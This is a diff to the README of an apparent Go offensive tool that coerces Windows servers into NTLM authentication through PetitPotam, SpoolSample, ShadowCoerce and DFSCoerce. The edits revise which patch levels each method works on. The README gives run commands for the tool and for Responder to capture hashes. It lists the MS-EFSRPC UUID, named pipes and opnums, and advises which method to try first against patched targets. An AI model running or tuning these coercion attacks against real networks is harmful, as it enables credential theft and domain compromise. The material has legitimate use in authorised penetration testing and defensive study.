@@ -36,12 +36,12 @@ sudo responder -I eth0 -v
 
 | Method | Protocol | Success Rate | Callbacks | Compatibility | Recommendation |
 |--------|----------|--------------|-----------|---------------|----------------|
-| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 6 | ALL Windows servers | ✅ **Best first choice** |
-| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **High callbacks** |
+| **PetitPotam** | MS-EFSRPC | ⭐⭐⭐⭐ | 6 | Server 2016-2022 (unpatched/partially patched) | ✅ **Best for older systems** |
+| **SpoolSample** | MS-RPRN | ⭐⭐⭐⭐⭐ | 3 | Default on most servers | ✅ **Most reliable** |
 | **ShadowCoerce** | MS-FSRVP | ⭐⭐ | Varies | Requires VSS configured | ⚠️ Situational only |
 | **DFSCoerce** | MS-DFSNM | ⭐ | Varies | Requires DFS Namespaces | ⚠️ Rarely works |
 
-**Recommendation**: Try **PetitPotam** first (works everywhere with 6 different methods), then **SpoolSample** (3 callbacks) if Print Spooler is running.
+**Recommendation**: Try **SpoolSample** first (works on most systems with Print Spooler), then **PetitPotam** (6 opnums, but patched on fully updated Win11/Server 2025).
 
 ---
 
@@ -60,15 +60,17 @@ Successfully coerces Windows servers to authenticate to an attacker-controlled l
 - ✅ **Single Binary** - No dependencies, portable Go executable
 
 **Supported Methods**:
-- ✅ **PetitPotam** (MS-EFSRPC) - 1 callback - Works on ALL Windows servers
-- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running
+- ✅ **PetitPotam** (MS-EFSRPC) - 6 opnums - Works on Server 2016-2022 (unpatched/partially patched)
+- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running (most reliable)
 - ⚠️ **ShadowCoerce** (MS-FSRVP) - Requires VSS service configured for RPC
 - ⚠️ **DFSCoerce** (MS-DFSNM) - Requires DFS Namespaces role installed
 
 **Tested Against**: 
-- Windows Server 2019 Domain Controller
-- Windows Server 2016/2019/2022
-- Windows 10/11 (with appropriate services)
+- ✅ Windows Server 2016/2019/2022 (unpatched/partially patched)
+- ✅ Windows 10 (unpatched/partially patched)
+- ❌ Windows 11 (fully patched) - PetitPotam blocked
+- ❌ Windows Server 2025 (fully patched) - PetitPotam blocked
+- ✅ SpoolSample works on most patched systems if Print Spooler enabled
 
 **Authentication Methods**:
 - ✅ Password authentication (plaintext or prompted)
@@ -162,8 +164,8 @@ All flags use the modern GNU-style format with short (`-t`) and long (`--target`
 | `-h` | `--help` | - | Display help message and exit | *(boolean flag, no value)* |
 
 **Method Details**:
-- `petitpotam`: MS-EFSRPC - **6 opnums**, works on ALL Windows versions, **most reliable**
-- `spoolsample`: MS-RPRN - **3 callbacks**, requires Print Spooler service running
+- `petitpotam`: MS-EFSRPC - **6 opnums**, works on Server 2016-2022 unpatched/partially patched (blocked on fully patched Win11/Server 2025)
+- `spoolsample`: MS-RPRN - **3 callbacks**, requires Print Spooler service running, **most reliable on patched systems**
 - `shadowcoerce`: MS-FSRVP - Requires Volume Shadow Copy (VSS) service configured
 - `dfscoerce`: MS-DFSNM - Requires DFS Namespaces role installed (rarely works)
 
@@ -330,7 +332,7 @@ sudo responder -I eth0 -v
 
 ## Attack Methods
 
-### PetitPotam (MS-EFSRPC) ✅ Most Reliable
+### PetitPotam (MS-EFSRPC) ✅ Reliable on Unpatched Systems
 
 - **Default Pipe**: `\pipe\lsarpc`
 - **Alternative Pipes**: `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (all work with all 6 opnums)
@@ -338,17 +340,17 @@ sudo responder -I eth0 -v
 - **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
 - **Opnums** (6 different functions for maximum success rate): 
   - 0: EfsRpcOpenFileRaw (often patched)
-  - 4: EfsRpcEncryptFileSrv (reliable)
+  - 4: EfsRpcEncryptFileSrv (reliable on unpatched)
   - 5: EfsRpcDecryptFileSrv (alternative)
   - 6: EfsRpcQueryUsersOnFile (query-based)
   - 7: EfsRpcQueryRecoveryAgents (recovery agent)
   - 12: EfsRpcFileKeyInfo (key info)
 - **Callbacks**: 6 authentication attempts (tries all opnums on chosen pipe)
 - **Target Parameter**: UNC path in MS-EFSRPC function calls
-- **Compatibility**: Works on **ALL Windows servers** (core service)
+- **Compatibility**: Works on **Server 2016-2022 unpatched/partially patched** (blocked on fully patched Win11/Server 2025 with KB5005413+)
 - **Discovery**: @topotam77
 
-**Why it works**: The MS-EFSRPC interface is accessible through multiple named pipes (lsarpc, samr, netlogon, lsass). All pipes bind to the same UUID and support all 6 opnums. The tool tries **6 different MS-EFSRPC functions** to maximize success even if some are patched.
+**Why it works**: The MS-EFSRPC interface is accessible through multiple named pipes (lsarpc, samr, netlogon, lsass). All pipes bind to the same UUID and support all 6 opnums. The tool tries **6 different MS-EFSRPC functions** to maximize success even if some are patched. However, fully patched Windows 11 and Server 2025 systems have additional mitigations that block these techniques.
 
 **Example Output**:
 ```
@@ -393,7 +395,9 @@ sudo responder -I eth0 -v
 
 ## 🔥 Enhanced PetitPotam Implementation
 
-Unlike the original PetitPotam PoC which only tries 2 opnums (0 and 4), this implementation attempts **6 different MS-EFSRPC functions** to maximize success rate:
+**⚠️ Compatibility Note**: PetitPotam works on **unpatched/partially patched** Windows Server 2016-2022 and Windows 10. It is **blocked on fully patched Windows 11 and Server 2025** due to KB5005413 and additional mitigations. For fully patched systems, use SpoolSample instead.
+
+Unlike the original PetitPotam PoC which only tries 2 opnums (0 and 4), this implementation attempts **6 different MS-EFSRPC functions** to maximize success rate on vulnerable systems:
 
 ```bash
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
@@ -721,7 +725,7 @@ sudo responder -I eth0 -v
 # Terminal 2: Build
 ./build.sh
 
-# Test PetitPotam (works on all servers - tries 6 opnums)
+# Test PetitPotam (works on unpatched/partially patched systems - tries 6 opnums)
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
 # Expected: 6 authentication attempts in Responder (one per opnum)
 
@@ -877,7 +881,7 @@ The main code uses `WritePipe()` and `ReadPipe()` throughout for DCERPC communic
 ## ❓ FAQ
 
 **Q: Which method should I use first?**  
-A: **PetitPotam** (default). It works on all Windows servers. If you want maximum callbacks, use **SpoolSample** (3 callbacks).
+A: **SpoolSample** is most reliable on patched systems (3 callbacks). **PetitPotam** (default, 6 opnums) works on unpatched/partially patched Server 2016-2022 but is blocked on fully patched Windows 11/Server 2025.
 
 **Q: What does ERROR_BAD_NETPATH mean?**  
 A: **Success!** This indicates the server tried to access your UNC path. Check Responder for the captured hash.
